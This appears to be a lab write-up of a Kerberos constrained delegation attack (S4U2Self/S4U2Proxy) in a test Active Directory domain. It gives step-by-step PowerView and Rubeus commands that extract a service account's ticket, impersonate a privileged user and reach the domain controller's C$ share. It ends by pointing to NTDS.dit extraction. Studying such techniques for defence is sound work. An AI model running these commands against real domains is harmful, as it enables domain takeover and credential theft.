Constrained Delegation


Constrained Delegation (S4U2Self & S4U2Proxy)

  1. 1.

    1. Hypothesis & Concept

Hypothesis: We suspected that some service accounts in the shinobi.local domain were configured with Constrained Delegation with Protocol Transition enabled (TRUSTED_TO_AUTH_FOR_DELEGATION).

Concept: Unlike Unconstrained Delegation (which requires a user to interact with the compromised machine), Constrained Delegation with Protocol Transition allows a service account to impersonate any user in the domain (via the S4U2Self extension) and then request access to a specific target service on their behalf (via the S4U2Proxy extension). If an attacker compromises this service account, they can forge a ticket as a Domain Admin to the allowed target service. Furthermore, due to SPN Equivalence (Service Principal Name equivalence), a ticket for HTTP can often be used for CIFS (file shares) or HOST (remote execution) if they run under the same context.

  1. 2.

    2. Vulnerability Identification (Reconnaissance)

Objective: Identify accounts configured with Constrained Delegation and Protocol Transition. Tool: PowerView (ActiveDirectory Module)

Command:

Get-NetUser -TrustedToAuth

Findings: The query revealed that the svc_saiyan account has the TRUSTED_TO_AUTH_FOR_DELEGATION flag set in its useraccountcontrol attribute. Crucially, the msds-allowedtodelegateto attribute showed it is permitted to delegate to {HTTP/DC01, HTTP/DC01.shinobi.local}. This means if we compromise svc_saiyan, we can impersonate anyone to the Domain Controller's web/RPC services.

  1. 3.

    3. Attack Execution Step 1: Baseline Verification

Objective: Prove that the svc_saiyan account does not inherently possess administrative privileges on the Domain Controller.

Command:

dir \\dc01\c$

Findings: Running under the context of shinobi\svc_saiyan, attempting to list the Domain Controller's C$ share resulted in a strict Access is denied.

  1. 4.

    4. Attack Execution Step 2: Extracting the TGT

Objective: To perform the S4U attack, we first need a usable Ticket Granting Ticket (TGT) for the compromised svc_saiyan account. We used Rubeus's tgtdeleg module to extract a fresh, usable TGT into Base64 format.

Tool: Rubeus.exe

Command:

.\Rubeus.exe tgtdeleg /nowrap

Findings: Rubeus successfully extracted the session key and output the Base64 .kirbi ticket for svc_saiyan.

  1. 5.

    5. Attack Execution Step 3: The S4U Impersonation Attack

Objective: Abuse the S4U2Self and S4U2Proxy Kerberos extensions to forge a service ticket. We will use the svc_saiyan TGT to impersonate a highly privileged user (itachi_anbu01) to the target service on the Domain Controller (HTTP/DC01.shinobi.local). Tool: Rubeus.exe

Command:

.\Rubeus.exe s4u /ticket:doIF...[Base64_TGT] /impersonateuser:itachi_anbu01 /domain:shinobi.local /msdsspn:HTTP/DC01.shinobi.local /dc:dc01.shinobi.local /ptt /nowrap

Findings: 1. Rubeus executed the S4U2Self request to obtain a TGS for itachi_anbu01 to svc_saiyan. 2. Rubeus then executed the S4U2Proxy request, exchanging that ticket for a TGS to HTTP/DC01.shinobi.local acting as itachi_anbu01. 3. The /ptt flag successfully injected this forged ticket directly into our current memory session.

  1. 6.

    6. Exploitation & Impact (Verification)

Objective: Verify the forged ticket is loaded and provides administrative access to the Domain Controller.

Commands:

klist
dir //dc01.shinobi.local/c$

Findings: * Checking klist confirmed that our current session now holds a Kerberos ticket for Client: itachi_anbu01 @ SHINOBI.LOCAL targeting Server: HTTP/DC01.shinobi.local.

  • We re-attempted the directory listing on the Domain Controller's C$ share. This time, leveraging SPN equivalence (where the HTTP ticket is seamlessly accepted for CIFS SMB access), the command succeeded.

  • Impact: We achieved full file-system read/write access to the Domain Controller. From here, we can extract the NTDS.dit database or execute code via PsExec/WMI using the compromised itachi_anbu01 context, signifying total domain compromise.
